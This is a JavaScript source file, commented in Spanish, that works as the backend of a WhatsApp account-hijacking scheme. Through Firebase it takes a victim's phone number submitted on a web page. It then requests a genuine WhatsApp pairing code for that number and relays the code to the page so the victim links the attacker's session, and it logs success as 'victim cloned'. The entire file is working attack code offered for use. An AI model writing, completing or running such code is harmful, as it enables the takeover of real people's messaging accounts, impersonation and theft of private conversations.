const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHAR CUANDO LA WEB MANDA EL NUMERO
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.status === "intentar_vinculo_maestro") {
        console.log(">>> INTENTANDO VINCULACIÓN PARA: " + data.numero_victima);
        try {
            // Forzamos al motor a pedir el código real. 
            // IMPORTANTE: WhatsApp generará un código nuevo interno. 
            // Si el código NO es el mismo que MASTER_CODE, el robot actualizará Firebase.
            const realCode = await client.requestPairingCode(data.numero_victima);
            
            console.log(">>> CÓDIGO REAL GENERADO: " + realCode);
            
            // Actualizamos la web con el CÓDIGO REAL para que la víctima no falle
            await snap.ref.update({
                pairingCode: realCode,
                status: "mostrando_codigo"
            });
        } catch (e) {
            console.log(">>> Error: " + e.message);
        }
    }
});

client.on('ready', () => {
    console.log(">>> [!!!] VÍCTIMA CLONADA CON ÉXITO");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();
http.createServer((req, res) => { res.end('READY'); }).listen(process.env.PORT || 3000);
